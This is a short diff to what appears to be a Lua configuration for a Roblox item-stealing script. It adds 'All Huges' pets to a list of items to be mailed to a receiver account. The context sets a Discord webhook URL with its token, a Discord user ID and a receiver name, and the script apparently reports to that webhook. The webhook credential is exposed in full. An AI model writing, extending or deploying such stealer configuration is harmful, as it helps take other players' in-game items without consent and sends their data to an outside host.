@@ -13,6 +13,7 @@ _G.GWEBHOOK_USERID = "1167566243969126442"
 _G.GWEBHOOK_LINK = "https://discord.com/api/webhooks/1311053918716825720/Vi7JJ2QrcUtkNdGixBbwBWLl-uyhAzj2opmljacNj1hAML808QkEmcj2U5sPelLG475s"
 _G.GMAIL_RECEIVERS = {"Pr4m0t"}
 _G.GMAIL_ITEMS = {
+  ["All Huges"] = {Class = "Pet", Id = "All Huges", Amount = 1},
   ["Snowflake Gifts"] = {Class = "Lootbox", Id = "Snowflake Gift", MinAmount = 200},
   ["2024 Gargantuan Christmas Present"] = {Class = "Lootbox", Id = "2024 Gargantuan Christmas Present", MinAmount = 1},
   ["2024 X-Large Christmas Present"] = {Class = "Lootbox", Id = "2024 X-Large Christmas Present", MinAmount = 10},
